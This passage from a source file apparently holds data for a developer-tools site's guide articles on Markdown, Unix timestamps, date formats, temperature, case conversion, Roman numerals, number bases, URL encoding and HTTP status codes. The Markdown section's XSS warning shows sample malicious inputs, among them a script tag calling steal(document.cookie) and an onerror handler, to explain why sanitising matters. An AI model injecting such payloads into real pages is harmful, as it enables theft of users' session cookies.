- Unordered item
- Another item
  - Nested item

1. Ordered item
2. Second item
   1. Nested ordered
\`\`\`

### Code Blocks
Fenced code blocks with optional syntax highlighting:
\`\`\`markdown
    \`\`\`javascript
    function hello() {
      console.log("Hello, World!");
    }
    \`\`\`
\`\`\`

### Blockquotes
\`\`\`markdown
> This is a blockquote.
> It can span multiple lines.
>
> And multiple paragraphs.
\`\`\`

### Tables (Extended Markdown)
\`\`\`markdown
| Column 1 | Column 2 | Column 3 |
|----------|----------|----------|
| Cell A   | Cell B   | Cell C   |
| Cell D   | Cell E   | Cell F   |
\`\`\`

## CommonMark: The Standard

Original Markdown had ambiguous specifications. CommonMark (commonmark.org) is a strict, unambiguous specification adopted by GitHub, GitLab, Stack Overflow, and many other platforms. GitHub Flavored Markdown (GFM) extends CommonMark with task lists, tables, and autolinked URLs.

## Markdown Processing Libraries

### JavaScript
- **marked**: Fast, compact, widely used
- **markdown-it**: Fully featured with plugin ecosystem
- **remark**: Unified ecosystem, AST-based processing
- **micromark**: Smallest CommonMark-compliant parser

### Python
- **Python-Markdown**: The standard library
- **mistune**: Fast with extensible rendering
- **marko**: CommonMark-compliant

### Server-Side vs. Client-Side Rendering
For performance and SEO, prefer server-side Markdown rendering. Client-side rendering requires shipping the parser to the browser and delays first meaningful paint.

## Security: XSS in Markdown-to-HTML

Markdown can contain raw HTML, which is rendered as-is by default. This creates XSS vulnerabilities when processing user-generated Markdown:

Malicious input:
\`\`\`markdown
[Click me](javascript:alert('xss'))
<script>steal(document.cookie)</script>
<img src="x" onerror="maliciousCode()">
\`\`\`

**Always sanitize HTML output** from Markdown converters when displaying user content. Use DOMPurify (browser) or sanitize-html (Node.js) after converting Markdown to HTML.

## Markdown in Different Contexts

### README Files (GitHub/GitLab)
Project documentation uses extensive Markdown features: badges, collapsible sections, mermaid diagrams, and code syntax highlighting.

### Static Site Generators
Jekyll, Hugo, Gatsby, Next.js, Astro, and others process Markdown files into HTML pages. Frontmatter YAML at the top of files provides metadata:
\`\`\`markdown
---
title: My Blog Post
date: 2024-01-15
tags: [webdev, javascript]
---

# Post Content Here
\`\`\`

### Documentation Tools
Docusaurus, MkDocs, GitBook, and Notion all use Markdown as their primary authoring format.

## Using the Markdown-to-HTML Converter

Our tool:
1. **Write or paste Markdown** in the input panel
2. **See live HTML output** with real-time preview rendering
3. **View rendered HTML** — see how it looks in a browser
4. **Copy HTML source** — get the raw HTML for use in your application
5. **GitHub Flavored Markdown** — supports tables, task lists, and auto-links

Use it for previewing Markdown formatting, generating HTML from documentation, and testing how your Markdown source will render on different platforms.
`,
  },
  {
    slug: 'unix-timestamp-guide',
    toolPath: '/unix-timestamp',
    title: 'Unix Timestamp Guide: What It Is, How to Convert, and Why It Matters',
    description: 'Understand Unix timestamps, convert between timestamps and human-readable dates, and learn about timezone pitfalls.',
    keywords: ['unix timestamp', 'epoch time', 'timestamp converter', 'unix time', 'epoch to date'],
    category: 'Converter',
    publishedAt: '2025-06-20',
    content: `## What Is a Unix Timestamp?

A Unix timestamp (also called POSIX time or epoch time) is the number of seconds that have elapsed since January 1, 1970, 00:00:00 UTC - the "Unix epoch." It is a simple, universal, and timezone-independent way to represent a specific point in time.

\`\`\`
Current time (example):  2025-06-15 14:30:00 UTC
Unix timestamp:          1750000200
\`\`\`

The Unix timestamp is an integer - no timezone, no locale, no calendar system. It is the same number everywhere in the world at any given moment.

## Why Unix Time?

Unix timestamps offer several advantages. They are timezone-agnostic: the timestamp does not change depending on where you are, and converting to local time is purely a display concern. They enable simple arithmetic: comparing times, calculating durations, and sorting records are all just integer operations. They have universal support: every programming language, database, and operating system understands Unix timestamps. And they are compact for storage: a 32-bit integer (or 64-bit for post-2038 dates) stores any date/time efficiently.

## The Year 2038 Problem

32-bit signed integers can store values up to 2,147,483,647, which corresponds to January 19, 2038, 03:14:07 UTC. After this moment, 32-bit timestamps overflow to negative values, causing incorrect dates on systems that have not migrated to 64-bit. Modern 64-bit timestamps extend the range to approximately the year 292 billion - safely beyond any practical concern.

## Unix Time vs. Human-Readable Time

| Format | Example | Timezone |
|---|---|---|
| Unix timestamp | 1750000200 | Always UTC |
| ISO 8601 | 2025-06-15T14:30:00Z | UTC specified |
| RFC 2822 | Mon, 15 Jun 2025 14:30:00 +0000 | Specified |
| Local time | Jun 15, 2025 10:30 AM EDT | Local |

## Working with Unix Timestamps in Code

\`\`\`javascript
// JavaScript
const now = Date.now();                    // Milliseconds since epoch
const nowSeconds = Math.floor(Date.now() / 1000); // Seconds

// Convert timestamp to Date
const date = new Date(1750000200 * 1000); // Multiply by 1000 (ms)
console.log(date.toISOString());           // "2025-06-15T14:30:00.000Z"

// Convert Date to timestamp
const timestamp = Math.floor(new Date('2025-06-15T14:30:00Z').getTime() / 1000);
\`\`\`

\`\`\`python
# Python
import time
from datetime import datetime, timezone

now = int(time.time())  # Current timestamp

# Timestamp to datetime
dt = datetime.fromtimestamp(1750000200, tz=timezone.utc)

# Datetime to timestamp
timestamp = int(datetime(2025, 6, 15, 14, 30, tzinfo=timezone.utc).timestamp())
\`\`\`

\`\`\`sql
-- SQL (PostgreSQL)
SELECT EXTRACT(EPOCH FROM NOW())::INTEGER;     -- Current timestamp
SELECT TO_TIMESTAMP(1750000200);               -- Timestamp to datetime
\`\`\`

## Unix Timestamps in Logs and APIs

Many systems use Unix timestamps for event logging and API responses:
- JWT \`exp\` claim: \`{ "exp": 1750000200 }\`
- AWS API responses: \`{ "LastModified": 1750000200 }\`
- Database columns: \`created_at INTEGER DEFAULT (unixepoch())\`

## Milliseconds vs. Seconds

Different systems use different resolutions. JavaScript \`Date.now()\` returns milliseconds, while Python \`time.time()\` returns seconds. A common bug is using milliseconds where seconds are expected, producing dates in 1970 or far in the future.

## How to Use This Tool

Enter a Unix timestamp (seconds or milliseconds) to see the corresponding UTC and local date/time, or enter a date and time to get the Unix timestamp. Click "Now" to get the current timestamp instantly.

-> Try the [Unix Timestamp Converter](/unix-timestamp)`,
  },
  {
    slug: 'date-time-converter-guide',
    toolPath: '/date-converter',
    title: 'Date and Time Conversion: Timezones, Formats, and Common Pitfalls',
    description: 'Convert dates between formats and timezones. Learn about ISO 8601, UTC, and how to avoid timezone bugs.',
    keywords: ['date converter', 'time zone converter', 'ISO 8601', 'date format', 'UTC converter'],
    category: 'Converter',
    publishedAt: '2025-06-21',
    content: `## Working with Dates and Times in Software

Date and time handling is famously complex in software development. Timezones, daylight saving time, leap years, different calendar systems, and inconsistent format standards make dates one of the most error-prone areas of programming.

A good date/time conversion tool helps developers and data professionals quickly convert between formats, timezones, and representations without needing to memorize every standard.

## Unix Timestamps

A **Unix timestamp** (also called epoch time or POSIX time) is the number of seconds elapsed since the Unix Epoch: January 1, 1970, 00:00:00 UTC. This is the fundamental time representation in Unix/Linux systems and widely used in databases, APIs, and logs.

Examples:
- \`0\` = 1970-01-01 00:00:00 UTC
- \`1000000000\` = 2001-09-09 01:46:40 UTC
- \`1700000000\` = 2023-11-14 22:13:20 UTC

**Millisecond timestamps** are common in JavaScript (\`Date.now()\` returns milliseconds). Python's \`time.time()\` returns seconds with fractional precision.

## ISO 8601 Format

**ISO 8601** is the international standard for date and time representations:
\`\`\`
2024-01-15T14:30:45Z           (UTC)
2024-01-15T14:30:45+05:30      (UTC+5:30, India)
2024-01-15T14:30:45-08:00      (UTC-8, US Pacific)
2024-01-15T14:30:45.123Z       (with milliseconds)
2024-01-15                     (date only)
14:30:45                       (time only)
\`\`\`

ISO 8601 is the recommended format for:
- API request/response bodies
- Database storage
- Log files
- Data exchange between systems

## Common Date Formats

Different regions and systems use different date formats:

| Format | Example | Region/System |
|--------|---------|---------------|
| YYYY-MM-DD | 2024-01-15 | ISO 8601, databases |
| MM/DD/YYYY | 01/15/2024 | United States |
| DD/MM/YYYY | 15/01/2024 | UK, Europe, Australia |
| DD.MM.YYYY | 15.01.2024 | Germany, Eastern Europe |
| YYYY年MM月DD日 | 2024年01月15日 | Japan/China (CJK) |
| RFC 2822 | Mon, 15 Jan 2024 14:30:45 +0000 | Email, HTTP headers |

## Timezones and UTC

**UTC (Coordinated Universal Time)** is the primary time standard. All other timezones are defined as offsets from UTC.

Common timezone offsets:
- UTC+0: UK (winter), Western Europe
- UTC+1 to UTC+2: Central/Eastern Europe
- UTC+5:30: India (IST)
- UTC+8: China (CST), Singapore
- UTC+9: Japan (JST)
- UTC-5: US Eastern (EST)
- UTC-8: US Pacific (PST)

**Daylight Saving Time (DST)** complicates timezone offsets. Many regions shift clocks by 1 hour seasonally. For this reason, store timestamps in UTC and convert to local time only for display.

## Date Arithmetic

Common date calculations:
- **Duration**: Difference between two timestamps (days, hours, minutes)
- **Date addition**: Add N days/months/years to a date
- **Day of week**: Determine which weekday a date falls on
- **Quarter**: Which fiscal/calendar quarter a date belongs to
- **Week number**: ISO week number of the year

## Programming with Dates

### JavaScript
\`\`\`javascript
const now = new Date();
const timestamp = Date.now(); // milliseconds since epoch
const isoString = now.toISOString(); // "2024-01-15T14:30:45.123Z"

// Modern approach with Temporal API (Stage 3)
const datetime = Temporal.Now.plainDateTimeISO();
\`\`\`

### Python
\`\`\`python
from datetime import datetime, timezone
now = datetime.now(timezone.utc)
timestamp = now.timestamp()  # seconds since epoch
iso_string = now.isoformat()
\`\`\`

## Using the Date-Time Converter Tool

Our tool:
1. **Enter any date format** — Unix timestamp, ISO 8601, or common local formats
2. **Convert to all formats** — see the same moment in multiple representations
3. **Timezone conversion** — convert between any two IANA timezones
4. **Relative time** — shows "3 days ago" or "in 2 hours" for context
5. **DST awareness** — correctly handles daylight saving transitions
6. **Copy any format** — one-click copy of any representation

Use it for debugging timestamp issues, converting between API formats, and understanding how a given moment appears in different timezones.
`,
  },
  {
    slug: 'temperature-converter-guide',
    toolPath: '/temperature-converter',
    title: 'Temperature Conversion: Celsius, Fahrenheit, Kelvin Explained',
    description: 'Convert between Celsius, Fahrenheit, and Kelvin. Learn the formulas and understand when each scale is used.',
    keywords: ['temperature converter', 'celsius to fahrenheit', 'fahrenheit to celsius', 'kelvin converter', 'temperature conversion'],
    category: 'Converter',
    publishedAt: '2025-06-22',
    content: `## Temperature Scales: A Brief History

The three major temperature scales were created at different times for different purposes.

Fahrenheit (degrees F) was developed by German physicist Daniel Gabriel Fahrenheit in 1724. He set 0 degrees F as the coldest temperature he could produce with an ice-salt mixture and 96 degrees F as human body temperature (later adjusted to 98.6 degrees F). Fahrenheit remains the primary scale in the United States for everyday use.

Celsius (degrees C), originally called centigrade, was proposed by Swedish astronomer Anders Celsius in 1742. He defined 0 degrees C as the freezing point of water and 100 degrees C as the boiling point at sea level, creating a convenient 100-degree scale for scientific use. Now the standard in most of the world.

Kelvin (K) was defined by Lord Kelvin (William Thomson) in 1848. It starts at absolute zero - the theoretical temperature at which all thermal motion ceases. There are no negative Kelvin values. Kelvin is the SI base unit of temperature, essential for physics and chemistry.

## Conversion Formulas

### Celsius to Fahrenheit
\`\`\`
°F = (°C * 9/5) + 32
Example: 100°C -> (100 * 1.8) + 32 = 212°F
\`\`\`

### Fahrenheit to Celsius
\`\`\`
°C = (°F - 32) * 5/9
Example: 98.6°F -> (98.6 - 32) * 5/9 = 37°C
\`\`\`

### Celsius to Kelvin
\`\`\`
K = °C + 273.15
Example: 0°C -> 273.15 K
\`\`\`

### Kelvin to Celsius
\`\`\`
°C = K - 273.15
Example: 373.15 K -> 100°C
\`\`\`

## Quick Reference Table

| Celsius | Fahrenheit | Kelvin | Description |
|---|---|---|---|
| -273.15 | -459.67 | 0 | Absolute zero |
| -40 | -40 | 233.15 | Scales converge |
| 0 | 32 | 273.15 | Water freezes |
| 20 | 68 | 293.15 | Room temperature |
| 37 | 98.6 | 310.15 | Body temperature |
| 100 | 212 | 373.15 | Water boils |

Note that -40 degrees is the same value in both Celsius and Fahrenheit - the one point where the scales intersect.

## Temperature in Science and Engineering

The ideal gas law uses Kelvin because gas properties are proportional to absolute temperature:
\`\`\`
PV = nRT   (P=pressure, V=volume, n=moles, R=gas constant, T=Kelvin)
\`\`\`

You cannot substitute Celsius or Fahrenheit into this formula - only Kelvin works correctly because it starts from true zero.

## Rankine: The Fourth Scale

Rankine (degrees R) is the Fahrenheit equivalent of Kelvin - an absolute scale where zero is absolute zero, but degrees are the same size as Fahrenheit degrees:
\`\`\`
°R = °F + 459.67
°R = K * 9/5
\`\`\`
Rankine is used in some American engineering applications.

## Everyday Temperature References

- -40 degrees: The one temperature that is identical in both Celsius and Fahrenheit
- 0°C (32°F): Water freezes at standard pressure
- 20°C (68°F): Standard comfortable room temperature
- 37°C (98.6°F): Normal human body temperature
- 100°C (212°F): Water boils at sea level (lower at high altitude)
- 160°C (320°F): Safe minimum internal temperature for poultry

## Climate Change Context

Global temperature anomaly is measured in Celsius relative to pre-industrial baseline. The Paris Agreement targets limiting warming to 1.5-2°C above pre-industrial levels, which translates to 2.7-3.6°F.

-> Try the [Temperature Converter](/temperature-converter)`,
  },
  {
    slug: 'case-converter-guide',
    toolPath: '/case-converter',
    title: 'String Case Converter: camelCase, snake_case, PascalCase and More',
    description: 'Convert text between camelCase, snake_case, PascalCase, kebab-case, and other naming conventions instantly.',
    keywords: ['case converter', 'camelCase converter', 'snake_case', 'PascalCase', 'kebab-case'],
    category: 'Converter',
    publishedAt: '2025-06-23',
    content: `## What Is Case Conversion?

**Case conversion** is the process of transforming text between different capitalization and word separation conventions. Different programming languages, file systems, database schemas, and writing styles use different naming conventions, and converting between them is a frequent developer task.

## Text Case Types

### Lowercase
All characters in lowercase: \`hello world\`

### UPPERCASE
All characters in uppercase: \`HELLO WORLD\`

### Title Case
First letter of each significant word capitalized: \`Hello World\`

### Sentence case
First letter of sentence capitalized: \`Hello world\`

## Programming Naming Conventions

### camelCase
Words joined without spaces, first word lowercase, subsequent words capitalized:
\`\`\`
helloWorld
getUserById
calculateTotalPrice
\`\`\`
Used in: JavaScript variables and functions, Java methods, Swift properties, TypeScript

### PascalCase (UpperCamelCase)
Like camelCase but first word also capitalized:
\`\`\`
HelloWorld
UserProfile
DatabaseConnection
\`\`\`
Used in: JavaScript/TypeScript class names, C# types, React components, Pascal language (hence the name)

### snake_case
Words separated by underscores, all lowercase:
\`\`\`
hello_world
user_id
get_user_by_id
\`\`\`
Used in: Python variables and functions, Ruby, PHP, SQL column names, file names in many Unix conventions

### SCREAMING_SNAKE_CASE (CONSTANT_CASE)
Like snake_case but all uppercase:
\`\`\`
MAX_RETRY_COUNT
DEFAULT_TIMEOUT_MS
API_BASE_URL
\`\`\`
Used in: Constants in most languages, environment variables, C/C++ macros

### kebab-case (dash-case, param-case)
Words separated by hyphens, all lowercase:
\`\`\`
hello-world
user-profile
get-user-by-id
\`\`\`
Used in: CSS class names, HTML attributes, URL slugs, npm package names, Kubernetes manifest names

### dot.case
Words separated by dots:
\`\`\`
hello.world
com.example.app
org.springframework.boot
\`\`\`
Used in: Java package names, configuration keys (Spring Boot, etc.), domain-reversed package identifiers

### path/case
Words separated by forward slashes:
\`\`\`
hello/world
src/components/button
\`\`\`
Used in: File paths, URL paths, import paths in some systems

### Header-Case (Train-Case)
Words separated by hyphens, each word capitalized:
\`\`\`
Hello-World
Content-Type
Authorization
\`\`\`
Used in: HTTP headers

## Why Case Conversion Matters

### Cross-Language Integration
JavaScript APIs typically use camelCase, while REST API endpoints often use kebab-case, and databases use snake_case. When building systems that span these layers, consistent conversion is essential.

### Code Generation
When generating code from external sources (database schemas, API definitions, config files), you need to convert names to the target language's convention.

### Data Import
Spreadsheet column headers (Title Case) need conversion to database column names (snake_case) or API field names (camelCase).

### Documentation and Communication
Technical writers converting between formal writing (Title Case) and code references (camelCase, snake_case).

## Conversion Rules

### Splitting Words
Case conversion first splits text into individual words, then rejoins in the target format. Word boundaries are detected at:
- Transitions from lowercase to uppercase (camelCase splitting)
- Spaces and existing separators (-, _, ., /, space)
- Consecutive uppercase letters followed by lowercase (APIResponse → API + Response)

### Preserving Acronyms
Acronyms like "HTML", "API", "URL", "ID" need special handling. Different style guides disagree:
- \`htmlParser\` vs \`HTMLParser\` (camelCase for HTML)
- \`apiKey\` vs \`APIKey\` (camelCase for API)
- \`userId\` vs \`userID\` (camelCase for ID)

Many converters provide options for acronym handling.

## Using the Case Converter Tool

Our tool:
1. **Enter any text** — handles any mix of case conventions as input
2. **Select target format** — camelCase, PascalCase, snake_case, kebab-case, and more
3. **Batch conversion** — convert multiple lines at once for bulk renaming
4. **Smart word splitting** — correctly splits on boundaries in any input format
5. **Copy result** — one-click copy in the target case format
6. **Acronym options** — choose how to handle common abbreviations

Use it for renaming variables across codebases, converting database column names to API field names, generating code from documentation, and creating consistent naming in multi-language projects.
`,
  },
  {
    slug: 'roman-numeral-converter-guide',
    toolPath: '/roman-numeral-converter',
    title: 'Roman Numeral Converter: How to Read and Write Roman Numerals',
    description: 'Convert between decimal numbers and Roman numerals. Learn the rules, symbols, and history.',
    keywords: ['roman numeral converter', 'roman numerals', 'convert roman numerals', 'roman number calculator'],
    category: 'Converter',
    publishedAt: '2025-06-24',
    content: `## What Are Roman Numerals?

Roman numerals are a numeral system that originated in ancient Rome and were the dominant notation in Europe for centuries. They use Latin alphabet letters to represent values and combine them through addition and subtraction rules.

Despite being replaced by the Hindu-Arabic numeral system for everyday arithmetic, Roman numerals remain in common use today on clock faces, book chapter numbers, movie sequels, year designations, outlines, and event names like Super Bowl numbers.

## The Seven Symbols

| Symbol | Value |
|---|---|
| I | 1 |
| V | 5 |
| X | 10 |
| L | 50 |
| C | 100 |
| D | 500 |
| M | 1,000 |

## The Subtractive Rule

Roman numerals use subtractive notation to avoid four identical symbols in a row:

| Roman | Value | Rule |
|---|---|---|
| IV | 4 | I before V = 5-1 |
| IX | 9 | I before X = 10-1 |
| XL | 40 | X before L = 50-10 |
| XC | 90 | X before C = 100-10 |
| CD | 400 | C before D = 500-100 |
| CM | 900 | C before M = 1000-100 |

Only these six subtractive combinations are standard. You write 999 as CMXCIX, not IM.

## Roman Numeral Examples

| Arabic | Roman | Breakdown |
|---|---|---|
| 4 | IV | 5-1 |
| 9 | IX | 10-1 |
| 14 | XIV | 10+4 |
| 40 | XL | 50-10 |
| 399 | CCCXCIX | 300+90+9 |
| 1776 | MDCCLXXVI | 1000+700+70+6 |
| 2025 | MMXXV | 2000+20+5 |
| 3999 | MMMCMXCIX | 3000+900+90+9 |

## Conversion Algorithm

### Arabic to Roman:
\`\`\`python
def to_roman(num):
    values = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1]
    symbols = ['M','CM','D','CD','C','XC','L','XL','X','IX','V','IV','I']
    result = ''
    for i, v in enumerate(values):
        while num >= v:
            result += symbols[i]
            num -= v
    return result

to_roman(2025)  # "MMXXV"
\`\`\`

### Roman to Arabic:
\`\`\`python
def from_roman(s):
    values = {'I':1, 'V':5, 'X':10, 'L':50, 'C':100, 'D':500, 'M':1000}
    result = 0
    for i in range(len(s)):
        curr = values[s[i]]
        next_val = values[s[i+1]] if i+1 < len(s) else 0
        if curr < next_val:
            result -= curr
        else:
            result += curr
    return result
\`\`\`

## Limits of Roman Numerals

The standard system covers 1-3,999. For numbers 4,000 and above, historical texts used a bar over a symbol (vinculum) to multiply it by 1,000, but these extensions are rarely used today. Zero has no Roman numeral - the concept of zero was not part of ancient Roman mathematics.

## Roman Numerals in Modern Usage

Roman numerals appear in many modern contexts. Clocks and watches traditionally use Roman numerals. Formal outlines use Roman numerals for top-level sections (I, II, III). Film and TV use them for sequel numbering (Star Wars Episode VII, Super Bowl LVIII). Royal and papal names use them (King Charles III, Pope John Paul II). Architecture commonly shows the year of construction in Roman numerals on building cornerstones. The Olympics numbers each edition (XXXIII Olympiad = Paris 2024).

-> Try the [Roman Numeral Converter](/roman-numeral-converter)`,
  },
  {
    slug: 'integer-base-converter-guide',
    toolPath: '/base-converter',
    title: 'Number Base Conversion: Binary, Octal, Decimal, Hex Explained',
    description: 'Convert numbers between binary (base 2), octal (base 8), decimal (base 10), and hexadecimal (base 16).',
    keywords: ['base converter', 'binary to decimal', 'hex to decimal', 'octal converter', 'number base conversion'],
    category: 'Converter',
    publishedAt: '2025-06-25',
    content: `## What Are Number Bases?

A number base (or radix) defines how many unique digits are available to represent numbers. Each position in a number represents a power of the base.

The four common bases in computing are: Base 10 (Decimal) using digits 0-9 which is the everyday number system; Base 2 (Binary) using digits 0-1 which is the language of computers; Base 16 (Hexadecimal) using digits 0-9 and A-F which provides a compact binary representation; and Base 8 (Octal) using digits 0-7 which is used in Unix file permissions.

The same value 255 is written differently in each base:
\`\`\`
Decimal:     255
Binary:      11111111
Hexadecimal: FF
Octal:       377
\`\`\`

## Why Different Bases?

### Binary (Base 2): The Hardware Reality
Digital circuits are fundamentally binary - a transistor is either on (1) or off (0). All computer data is ultimately binary at the hardware level.

### Hexadecimal (Base 16): Compact Binary
Binary is verbose. The number 255 requires 8 binary digits but only 2 hex digits. Since one hex digit equals exactly 4 binary bits, hex is a convenient shorthand for binary. One common pattern: \`1111 0100 1011 0101\` becomes \`F4B5\` in hex.

Hexadecimal is ubiquitous in memory addresses (0x7FFE42A3), color codes (#FF5733), SHA-256 hashes (2cf24dba...), IPv6 addresses (2001:0db8:...), assembly language, and byte representations in debugging.

### Octal (Base 8): Unix Legacy
Unix file permissions use octal notation because each octal digit represents exactly 3 bits (one set of read/write/execute permissions):
\`\`\`
chmod 755 -> rwxr-xr-x
7 = 111 = rwx (owner)
5 = 101 = r-x (group)
5 = 101 = r-x (others)
\`\`\`

## Conversion Process

### Decimal to Binary
Repeatedly divide by 2, collect remainders (read bottom-to-top):
\`\`\`
42 / 2 = 21 remainder 0
21 / 2 = 10 remainder 1
10 / 2 =  5 remainder 0
 5 / 2 =  2 remainder 1
 2 / 2 =  1 remainder 0
 1 / 2 =  0 remainder 1
42 decimal = 101010 binary
\`\`\`

### Binary to Decimal
Multiply each bit by its positional value (powers of 2):
\`\`\`
101010 = 1x32 + 0x16 + 1x8 + 0x4 + 1x2 + 0x1
       = 32 + 8 + 2 = 42
\`\`\`

### Binary to Hex
Group bits in sets of 4 from right:
\`\`\`
101010 -> 0010 1010 -> 2A
\`\`\`

## Integer Representations in Code

\`\`\`javascript
// JavaScript
(255).toString(2)   // "11111111" (binary)
(255).toString(8)   // "377" (octal)
(255).toString(16)  // "ff" (hex)

parseInt("FF", 16)        // 255
parseInt("377", 8)        // 255
parseInt("11111111", 2)   // 255

// Literals
0b11111111   // Binary literal (255)
0o377        // Octal literal (255)
0xFF         // Hex literal (255)
\`\`\`

\`\`\`python
bin(255)   # '0b11111111'
oct(255)   # '0o377'
hex(255)   # '0xff'

int('ff', 16)       # 255
int('11111111', 2)  # 255
\`\`\`

## Signed Integer Representation

Signed integers use two's complement encoding. The most significant bit (MSB) is the sign bit: 0 means positive, 1 means negative. To negate a number, flip all bits and add 1.

\`\`\`
+42 in 8-bit: 00101010
-42 in 8-bit: 11010110 (flip bits of 42, then +1)
\`\`\`

This is why an 8-bit signed integer ranges from -128 to 127, not -127 to 127.

## Floating Point: A Different World

Integer bases do not apply directly to floating-point numbers. IEEE 754 stores numbers in a binary scientific notation: \`value = sign * mantissa * 2^exponent\`. This is why 0.1 + 0.2 does not equal exactly 0.3 in most languages - 0.1 and 0.2 do not have exact binary representations.

-> Try the [Integer Base Converter](/integer-base-converter)`,
  },

  // ─── Web ──────────────────────────────────────────────────────
  {
    slug: 'url-encoding-explained',
    toolPath: '/url-encoder',
    title: 'URL Encoding Explained: Why Special Characters Must Be Escaped',
    description: 'Learn why URLs need encoding, what percent-encoding is, and how to encode/decode URLs correctly.',
    keywords: ['URL encoding', 'percent encoding', 'URL encode decode', 'encodeURIComponent', 'URL special characters'],
    category: 'Web',
    publishedAt: '2025-06-28',
    content: `## What Is URL Encoding?

URL encoding (also called percent encoding) converts characters that are not allowed in URLs into a format that can be safely transmitted over the internet. The process replaces unsafe characters with a percent sign (%) followed by two hexadecimal digits representing the character's ASCII or UTF-8 code.

Every URL must consist only of a defined set of safe characters. Anything outside that set must be encoded.

## Why URLs Have Restricted Characters

The URI specification (RFC 3986) divides characters into three categories:
1. **Reserved characters** that have special meaning in URIs: \`: / ? # [ ] @ ! $ & ' ( ) * + , ; =\`
2. **Unreserved characters** that are always safe: \`A-Z a-z 0-9 - _ . ~\`
3. **All others** that must be percent-encoded

If a reserved character appears in a query parameter value, it must be encoded. Otherwise, parsers misinterpret it as a structural separator.

## How Percent Encoding Works

\`\`\`
Space = 0x20 -> %20
!     = 0x21 -> %21
#     = 0x23 -> %23
&     = 0x26 -> %26
+     = 0x2B -> %2B (literal plus)
=     = 0x3D -> %3D
?     = 0x3F -> %3F
@     = 0x40 -> %40
\`\`\`

Multi-byte UTF-8 characters are encoded as multiple percent sequences:
\`\`\`
e with accent = UTF-8 0xC3 0xA9 -> %C3%A9
Chinese character = UTF-8 0xE4 0xB8 0xAD -> %E4%B8%AD
\`\`\`

## URL Encoding vs Form Encoding

There are two related but distinct encoding schemes. Percent-encoding (RFC 3986) converts spaces to \`%20\` and is used in path segments and strict URI conformance. Application/x-www-form-urlencoded converts spaces to \`+\` and is used in HTML form submissions. They have slightly different encoding rules.

\`\`\`javascript
// Percent-encoding (standard)
encodeURIComponent('hello world') // 'hello%20world'

// Form encoding (spaces as +)
new URLSearchParams({ q: 'hello world' }).toString() // 'q=hello+world'
\`\`\`

## JavaScript URL Encoding Functions

JavaScript has four functions for URL encoding and decoding:

| Function | Encodes | Use When |
|---|---|---|
| \`encodeURI\` | All except unreserved and structural chars | Encoding a full URL |
| \`encodeURIComponent\` | All except unreserved chars | Encoding query params, path segments |
| \`decodeURI\` | Reverses encodeURI | Decoding a full URL |
| \`decodeURIComponent\` | Reverses encodeURIComponent | Decoding URL components |

\`\`\`javascript
// Encoding a full URL - preserves structural characters
encodeURI('https://example.com/path?q=hello world')
// 'https://example.com/path?q=hello%20world'

// Encoding a query parameter value
encodeURIComponent('hello world & more')
// 'hello%20world%20%26%20more'

// Decoding
decodeURIComponent('hello%20world')  // 'hello world'
\`\`\`

## Common URL Encoding Examples

The most frequently encoded characters in web development are: space becomes %20, hash becomes %23 (use %23 inside query values since # is a fragment delimiter), ampersand becomes %26 (use %26 inside query values since & separates parameters), plus becomes %2B (for literal plus symbols), forward slash becomes %2F (for literal slashes in path segments), and equals becomes %3D (inside parameter values).

## URL Structure and Where Encoding Applies

\`\`\`
https://example.com:8080/path?key=value&foo=bar#section
\`\`\`

Each part has different encoding rules. Path segments should encode everything except unreserved characters and the slash separator. Query parameters should encode ampersands, equals signs, plus symbols, percent signs, and others. Fragments follow similar rules to query encoding.

## Internationalized URLs

Modern browsers display internationalized domain names and paths in their Unicode form but transmit them encoded. For example, a URL with Chinese characters in the path will be displayed nicely in the browser but transmitted as percent-encoded UTF-8 bytes. Domain names use Punycode (xn--) encoding for non-ASCII characters.

-> Try the [URL Encoder/Decoder](/url-encoder)`,
  },
  {
    slug: 'http-status-codes-complete-guide',
    toolPath: '/http-status-codes',
    title: 'HTTP Status Codes: The Complete Developer Reference',
    description: 'A comprehensive guide to all HTTP status codes: 1xx, 2xx, 3xx, 4xx, 5xx with real-world examples.',
    keywords: ['HTTP status codes', '404 not found', '500 server error', 'HTTP 301 redirect', 'status code reference'],
    category: 'Web',
    publishedAt: '2025-06-29',
    content: `## What Are HTTP Status Codes?

HTTP status codes are 3-digit numeric responses that a server returns to indicate the result of a client's request. When your browser loads a page, the server replies with a status code before sending any content. Understanding these codes is essential for web developers, API designers, and anyone debugging network issues.

Status codes are grouped into five classes based on their first digit:

| Class | Range | Meaning |
|---|---|---|
| 1xx | 100-199 | Informational - request received, continuing process |
| 2xx | 200-299 | Success - request was received, understood, and accepted |
| 3xx | 300-399 | Redirection - further action needed to complete request |
| 4xx | 400-499 | Client Error - request contains bad syntax or cannot be fulfilled |
| 5xx | 500-599 | Server Error - server failed to fulfill a valid request |

## The Most Important Status Codes

### 200 OK
The most common success response. The request succeeded and the response body contains the requested resource. A GET request for a webpage returns 200 with the HTML content.

### 201 Created
The request succeeded and a new resource was created. Returned after a successful POST that creates a database record. The response should include a Location header pointing to the new resource.

### 204 No Content
The request succeeded but there is no content to return. Common for DELETE operations or PUT updates where no response body is needed.

### 301 Moved Permanently
The resource has permanently moved to a new URL. Browsers and search engines update their cached URL. Used for domain migrations and URL restructuring.

### 302 Found (Temporary Redirect)
The resource temporarily lives at a different URL. The browser follows the redirect but remembers the original URL for future requests. Browsers typically change POST to GET after following a 302.

### 304 Not Modified
The client's cached version is still valid. Used with conditional requests (If-Modified-Since, If-None-Match). The server confirms the resource hasn't changed, saving bandwidth.

### 400 Bad Request
The server cannot process the request due to client error. The request contains malformed syntax, invalid parameters, or missing required fields.

### 401 Unauthorized
Authentication is required but was not provided or failed. The response includes a WWW-Authenticate header indicating the authentication scheme. Despite the name, it means "unauthenticated."

### 403 Forbidden
The server understood the request but refuses to authorize it. The client is authenticated but lacks permission. Unlike 401, re-authenticating won't help.

### 404 Not Found
The server cannot find the requested resource. The URL may be wrong, the resource may have been deleted, or access may be restricted to prevent information disclosure.

### 405 Method Not Allowed
The HTTP method (GET, POST, PUT, etc.) is not supported for this endpoint. The response includes an Allow header listing the supported methods.

### 408 Request Timeout
The server timed out waiting for the request. The client can repeat the request.

### 409 Conflict
The request conflicts with the current state of the server. Common when trying to create a duplicate resource or update a resource that has been modified concurrently.

### 410 Gone
The resource is permanently gone and no forwarding address is available. Unlike 404, the server explicitly indicates the resource existed but has been removed.

### 422 Unprocessable Entity
The request was well-formed but contained semantic errors. Common in REST APIs when JSON is valid but fails business rule validation.

### 429 Too Many Requests
Rate limiting is in effect. The response typically includes a Retry-After header. Used to prevent API abuse and DDoS attacks.

### 500 Internal Server Error
